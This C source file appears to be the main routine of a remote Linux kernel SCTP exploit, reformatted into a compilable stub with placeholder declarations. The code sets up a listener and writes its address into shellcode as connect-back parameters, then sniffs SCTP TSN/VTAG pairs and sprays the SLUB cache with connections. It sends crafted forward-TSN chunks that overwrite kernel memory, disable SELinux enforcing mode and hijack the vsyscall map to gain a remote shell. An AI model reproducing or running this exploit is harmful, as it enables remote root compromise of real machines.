#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_10__   TYPE_5__ ;
typedef  struct TYPE_9__   TYPE_4__ ;
typedef  struct TYPE_8__   TYPE_3__ ;
typedef  struct TYPE_7__   TYPE_2__ ;
typedef  struct TYPE_6__   TYPE_1__ ;

/* Type definitions */
struct TYPE_6__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  o ;
typedef  int /*<<< orphan*/  l ;
typedef  int __u32 ;
typedef  int __u16 ;
struct TYPE_10__ {int nconn; int /*<<< orphan*/  rport; int /*<<< orphan*/  rhost; int /*<<< orphan*/  lport; int /*<<< orphan*/  lhost; } ;
struct TYPE_9__ {scalar_t__ allocator_type; int slubsize; int chunksize; int ptrsize; int scodesize; int vsysjumpsize; scalar_t__ vsysjump; scalar_t__ scode; scalar_t__ vsysaddr; scalar_t__ selinux; scalar_t__ hostoff; scalar_t__ portoff; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_8__ {TYPE_2__ sin_addr; void* sin_port; void* sin_family; } ;

/* Variables and functions */
 int CLONE_VM ; 
 int /*<<< orphan*/  IPPROTO_SCTP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 void* PF_INET ; 
 int SIGCHLD ; 
 scalar_t__ SLAB_ALLOCATOR ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_REUSEADDR ; 
 scalar_t__ STACK_SIZE ; 
 int /*<<< orphan*/  __fatal (char*) ; 
 int /*<<< orphan*/  __fatal_perror (char*) ; 
 int /*<<< orphan*/  __msg (char*) ; 
 int /*<<< orphan*/  __msg_f (char*,scalar_t__,scalar_t__,scalar_t__,scalar_t__) ; 
 scalar_t__ __zero ; 
 scalar_t__ bind (int,struct sockaddr*,int) ; 
 int build_stream (scalar_t__,int,int) ; 
 int clone (int /*<<< orphan*/ ,scalar_t__,int,int /*<<< orphan*/ *) ; 
 scalar_t__ clone_stack ; 
 int /*<<< orphan*/  clone_thread ; 
 int /*<<< orphan*/  disable_abort () ; 
 TYPE_5__ h ; 
 void* htons (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  htons_streams (int /*<<< orphan*/ ,int) ; 
 void* inet_addr (int /*<<< orphan*/ ) ; 
 TYPE_4__* k ; 
 scalar_t__ listen (int,int) ; 
 int make_sctp_connection (int,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  memcpy (scalar_t__,int*,int) ; 
 int /*<<< orphan*/  multiplex (int) ; 
 scalar_t__ raw_sctp ; 
 int /*<<< orphan*/  sctp_getopt (int,char**) ; 
 int /*<<< orphan*/  send_fwd_chunk (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,scalar_t__,scalar_t__) ; 
 TYPE_3__ server_sctp ; 
 scalar_t__ setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  sleep (int) ; 
 void* socket (void*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int sport ; 
 int sport2 ; 
 int /*<<< orphan*/  streams ; 
 int /*<<< orphan*/  swap_to_SLAB_chunk () ; 
 scalar_t__ tsn ; 
 scalar_t__ tsn2 ; 
 scalar_t__ vtag ; 
 scalar_t__ vtag2 ; 
 int /*<<< orphan*/  wait (int /*<<< orphan*/ *) ; 

int main(int argc, char **argv)
{

  int ret, fd, i, listenfd,o=1;
  struct sockaddr_in l;
  __u32 lh;
  __u16 lp;

  sctp_getopt(argc, argv);

  listenfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o)) < 0)
   __fatal_perror("setsockopt: SO_REUSEADDR");
  
  l.sin_family = PF_INET;
  l.sin_port = htons(h.lport); 
  l.sin_addr.s_addr = inet_addr(h.lhost);
  if(bind(listenfd, (struct sockaddr *)&l, sizeof(l)) < 0)
    __fatal_perror("bind: sock");
  
  if(listen(listenfd, 4) < 0)
    __fatal_perror("listen: sock");
  

  /* set connect back params */
  lh = inet_addr(h.lhost);
  lp = htons(h.lport);
  memcpy(k->scode + k->portoff, &lp, 2);
  memcpy(k->scode + k->hostoff, &lh, 4);

  raw_sctp = socket(PF_INET, SOCK_RAW, IPPROTO_SCTP);
  if(raw_sctp < 0)
    __fatal_perror("socket: RAW/SCTP montitor socket");
  
  server_sctp.sin_family = PF_INET;
  server_sctp.sin_port = htons(h.rport); 
  server_sctp.sin_addr.s_addr = inet_addr(h.rhost);

  __msg("[**] Monitoring Network for TSN/VTAG pairs.. \n");
  ret = clone(clone_thread, clone_stack+STACK_SIZE-8, CLONE_VM|SIGCHLD, NULL);
  if(ret < 0)
    __fatal_perror("clone");
  
  sleep(1);

  __msg("[**] Start flushing slub cache...\n");
  for(i=0; i<=h.nconn; i++)
  {
    __u16 p = sport-(h.nconn-1)+i;
    if(p == sport || p== sport2)
      fd = make_sctp_connection(p, h.rport, 1);
    else 
      fd = make_sctp_connection(sport-(h.nconn-1)+i, h.rport, 0);
//    usleep(10);
  } 


  disable_abort(); 
  /* wait for monitoring engine */ 
  wait(NULL);

  if(k->allocator_type == SLAB_ALLOCATOR)
    swap_to_SLAB_chunk();
 
  if(vtag && tsn && vtag2 && tsn2)   
  {
    __u32 acc;
    
    __msg_f("[**] Using TSN/VTAG pairs: (TSN: %x <=> VTAG: %x) / (TSN: %x <=> VTAG: %x)...\n", tsn, vtag, tsn2, vtag2);
    sleep(1);

    if(k->selinux)
    {
      __msg("[**] Overwriting neightboard sctp map..\n");
      acc = (k->slubsize - k->chunksize) / 2;
      ret = build_stream(k->selinux, k->ptrsize, acc); 
      if(ret < 0)
        __fatal("Error Building Streams...");
    
      htons_streams(streams, ret);
      send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn); 

      __msg("[**] Disabling Selinux Enforcing Mode..\n");
      ret = build_stream(__zero, 4, 0);
      if(ret < 0)
        __fatal("Error Building Streams...");

      htons_streams(streams, ret);
      send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 
    }

    __msg("[**] Overwriting neightboard sctp map ......\n");
    acc = (k->slubsize - k->chunksize) / 2;
    ret = build_stream(k->vsysaddr, k->ptrsize, acc); 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport, h.rport, streams, ret, vtag, tsn); 

    __msg("[**] Overwriting vsyscall shadow map..\n");
    acc = 0x930 / 2;
    ret = build_stream(k->scode, k->scodesize, acc); //1176 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 
     
    __msg("[**] Hijacking vsyscall shadow map..\n");
    ret = build_stream(k->vsysjump, k->vsysjumpsize, 0); 
    if(ret < 0)
      __fatal("Error Building Streams...");

    htons_streams(streams, ret);
    send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 

    sleep(1); 
  }
  else
    __fatal("VTAG/TSN not found: network error");


  multiplex(listenfd); 
  __msg("[**] Closing Connection... \n");
  return 0;
}